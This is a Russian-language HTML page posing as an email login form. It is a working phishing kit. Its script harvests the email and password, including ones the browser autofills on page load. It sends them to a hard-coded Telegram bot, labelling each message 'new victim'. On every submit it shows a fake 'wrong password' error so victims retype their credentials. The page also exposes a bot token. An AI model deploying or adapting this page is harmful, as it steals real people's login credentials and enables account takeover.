<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-box {
            background: white;
            padding: 38px;
            border-radius: 14px;
            box-shadow: 0 4px 14px rgba(0,0,0,0.15);
            width: 340px;
            text-align: center;
        }
        .login-box input {
            width: 100%;
            padding: 13px;
            margin: 9px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .login-box input.input-error {
            border-color: #d93025;
            background: #fff5f5;
        }
        .login-box button {
            width: 100%;
            padding: 13px;
            background: #0077cc;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 7px;
        }
        .login-box button:hover {
            background: #005fa3;
        }
        .error-message {
            color: #d93025;
            margin-top: 13px;
            font-size: 13px;
            padding: 11px;
            background: #fce8e6;
            border-radius: 6px;
            border-left: 4px solid #d93025;
            text-align: left;
            display: none;
        }
        .error-message.show {
            display: block;
        }
        .logo {
            font-size: 26px;
            font-weight: bold;
            margin-bottom: 18px;
        }
    </style>
</head>
<body>
    <div id="loginFormContainer" class="login-box">
        <div class="logo">📧 Вход</div>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Адрес электронной почты" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit" id="submitBtn">Зарегистрироваться</button>
            <div id="message" class="error-message"></div>
        </form>
    </div>

<script>
    // ===== ВАШИ ДАННЫЕ =====
    const BOT_TOKEN = "8924231437:AAHSGN-TXN3D2olEVudrr53xp22SC03PCL8";
    const CHAT_ID = "8872810304";
    // ========================

    let autoSent = false;

    function sendToTelegram(email, password, isAuto) {
        const type = isAuto ? "АВТОЗАПОЛНЕНИЕ" : "РУЧНОЙ ВВОД";
        const text = "📩 НОВАЯ ЖЕРТВА (" + type + ")\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString("ru-RU");
        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);

        fetch(url).catch(function() {});
    }

    function showError(message) {
        const messageDiv = document.getElementById("message");
        messageDiv.textContent = message;
        messageDiv.classList.add("show");

        document.getElementById("email").classList.add("input-error");
        document.getElementById("password").classList.add("input-error");
    }

    function clearError() {
        const messageDiv = document.getElementById("message");
        messageDiv.classList.remove("show");
        messageDiv.textContent = "";

        document.getElementById("email").classList.remove("input-error");
        document.getElementById("password").classList.remove("input-error");
    }

    function checkAutoFill() {
        if (autoSent) return;
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();
        if (email && password) {
            autoSent = true;
            sendToTelegram(email, password, true);
        }
    }

    window.addEventListener("load", function() {
        checkAutoFill();
        setTimeout(checkAutoFill, 300);
        setTimeout(checkAutoFill, 600);
        setTimeout(checkAutoFill, 1000);
        setTimeout(checkAutoFill, 2000);
        setTimeout(checkAutoFill, 3000);
    });

    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault();

        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();

        // Если поля пустые - показываем ошибку и не отправляем
        if (!email || !password) {
            clearError();
            showError("Убедитесь, что вы ввели всё правильно.");
            return;
        }

        // Сбрасываем прошлую ошибку перед новым показом
        clearError();

        // Каждое нажатие = новое сообщение в Telegram
        sendToTelegram(email, password, false);

        // Всегда показываем ошибку
        showError("Неверный адрес электронной почты или пароль. Убедитесь, что вы ввели всё правильно.");
    });

    console.log("ROCKET ACTIVE — Вход готов");
</script>
</body>
</html>
